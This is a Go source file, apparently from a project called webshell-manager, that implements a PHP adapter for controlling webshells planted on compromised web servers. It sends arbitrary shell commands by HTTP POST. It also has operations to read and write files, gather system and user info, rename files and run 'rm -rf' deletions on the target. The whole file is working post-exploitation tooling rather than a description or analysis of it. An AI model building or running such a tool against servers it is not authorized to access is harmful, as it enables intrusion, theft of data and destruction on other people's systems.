// Package adapters 实现具体的协议适配器。
package adapters

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/webshell-manager/webshell-manager/internal/operation"
	"github.com/webshell-manager/webshell-manager/internal/target"
	"github.com/webshell-manager/webshell-manager/internal/transport"
)

// PHPAdapter 是 PHP 类型 WebShell 的协议适配器。
// 通过 HTTP POST 将参数传递给目标端的 PHP webshell。
type PHPAdapter struct {
	transport transport.Transport
}

// NewPHPAdapter 创建 PHP 协议适配器。
func NewPHPAdapter(t transport.Transport) *PHPAdapter {
	return &PHPAdapter{transport: t}
}

// Name 返回协议名称。
func (a *PHPAdapter) Name() string { return "php" }

// Check 探活：向目标发送一个无害的命令（echo），验证目标是否返回预期标记。
func (a *PHPAdapter) Check(ctx context.Context, t *target.Target) error {
	marker := "WSM_OK"
	cmd := "echo " + marker

	resp, err := a.sendCommand(ctx, t, cmd)
	if err != nil {
		return err
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("目标返回非 200 状态码: %d", resp.StatusCode)
	}
	if !strings.Contains(string(resp.Body), marker) {
		return fmt.Errorf("目标未返回预期标记，可能不是有效的 PHP webshell")
	}
	return nil
}

// Execute 在目标上执行统一操作。
func (a *PHPAdapter) Execute(ctx context.Context, t *target.Target, op *operation.Operation) (*operation.Result, error) {
	cmd, err := a.buildCommand(op)
	if err != nil {
		return &operation.Result{Success: false, Error: err.Error()}, nil
	}

	resp, err := a.sendCommand(ctx, t, cmd)
	if err != nil {
		return &operation.Result{Success: false, Error: err.Error()}, nil
	}
	return &operation.Result{Success: true, Output: string(resp.Body)}, nil
}

// buildCommand 根据操作类型构造要执行的命令。
// 命令为 shell 命令（目标端 PHP webshell 通过 system/eval 执行）。
func (a *PHPAdapter) buildCommand(op *operation.Operation) (string, error) {
	switch op.Type {
	case operation.OperationCommand:
		cmd, _ := op.Params["cmd"].(string)
		if cmd == "" {
			return "", fmt.Errorf("缺少 cmd 参数")
		}
		return cmd, nil

	case operation.OperationListDir:
		path, _ := op.Params["path"].(string)
		if path == "" {
			path = "."
		}
		return "ls -la " + shellQuote(path), nil

	case operation.OperationReadFile:
		path, _ := op.Params["path"].(string)
		if path == "" {
			return "", fmt.Errorf("缺少 path 参数")
		}
		return "cat " + shellQuote(path), nil

	case operation.OperationWriteFile:
		path, _ := op.Params["path"].(string)
		content, _ := op.Params["content"].(string)
		if path == "" {
			return "", fmt.Errorf("缺少 path 参数")
		}
		return "printf '%s' " + shellQuote(content) + " > " + shellQuote(path), nil

	case operation.OperationSystemInfo:
		return "uname -a && id && pwd", nil

	case operation.OperationRename:
		from, _ := op.Params["from"].(string)
		to, _ := op.Params["to"].(string)
		if from == "" || to == "" {
			return "", fmt.Errorf("缺少 from/to 参数")
		}
		return "mv " + shellQuote(from) + " " + shellQuote(to), nil

	case operation.OperationMkdir:
		path, _ := op.Params["path"].(string)
		if path == "" {
			return "", fmt.Errorf("缺少 path 参数")
		}
		return "mkdir -p " + shellQuote(path), nil

	case operation.OperationDelete:
		path, _ := op.Params["path"].(string)
		if path == "" {
			return "", fmt.Errorf("缺少 path 参数")
		}
		return "rm -rf " + shellQuote(path), nil

	default:
		return "", fmt.Errorf("协议 %q 暂不支持操作 %q", a.Name(), op.Type)
	}
}

// shellQuote 对 shell 参数做基础转义，降低命令注入风险。
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

// sendCommand 构造并发送命令请求。
// 命令通过 POST 的 cmd 参数传递，使用目标的 Method/Headers/Cookies。
func (a *PHPAdapter) sendCommand(ctx context.Context, t *target.Target, cmd string) (*transport.Response, error) {
	method := t.Method
	if method == "" {
		method = "POST"
	}

	headers := parseHeaderString(t.Headers)
	body := url.Values{"cmd": {cmd}}.Encode()

	req := &transport.Request{
		Method:  method,
		URL:     t.URL,
		Headers: headers,
		Body:    []byte(body),
	}

	// 设置 Cookie。
	if t.Cookies != "" {
		req.Headers["Cookie"] = t.Cookies
	}
	if req.Headers["Content-Type"] == "" {
		req.Headers["Content-Type"] = "application/x-www-form-urlencoded"
	}

	return a.transport.Request(ctx, req)
}

// parseHeaderString 解析形如 "K1: V1\nK2: V2" 的头部字符串。
func parseHeaderString(s string) map[string]string {
	headers := make(map[string]string)
	if strings.TrimSpace(s) == "" {
		return headers
	}
	for _, line := range strings.Split(s, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.Index(line, ":")
		if idx <= 0 {
			continue
		}
		key := strings.TrimSpace(line[:idx])
		val := strings.TrimSpace(line[idx+1:])
		if key != "" {
			headers[key] = val
		}
	}
	return headers
}
